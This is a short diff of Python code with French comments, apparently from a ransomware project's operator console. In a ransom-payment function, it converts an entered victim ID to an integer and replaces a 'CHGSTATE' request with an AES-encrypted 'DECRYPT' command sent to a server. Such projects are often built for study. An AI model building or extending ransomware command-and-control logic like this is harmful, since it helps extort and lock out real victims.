@@ -131,11 +131,11 @@ def affichage_payement_rancon():
         print("Clé partagée échangée avec succès.")
 
         # Récupération de l'id de la victime
-        victim_id = input("Entrez le numéro de la victime : ")
+        victim_id = int(input("Entrez le numéro de la victime : "))
         print(f"ID de la victime entré : {victim_id}")
 
         # Envoi de la requête
-        msg = message.set_message("CHGSTATE", victim_id)
+        msg = message.set_message("DECRYPT", [victim_id, None, None])
         encrypted_msg = security.aes_encrypt(msg, key)
         network.send_message(s, encrypted_msg)
         print("Requête de changement d'état envoyée.")
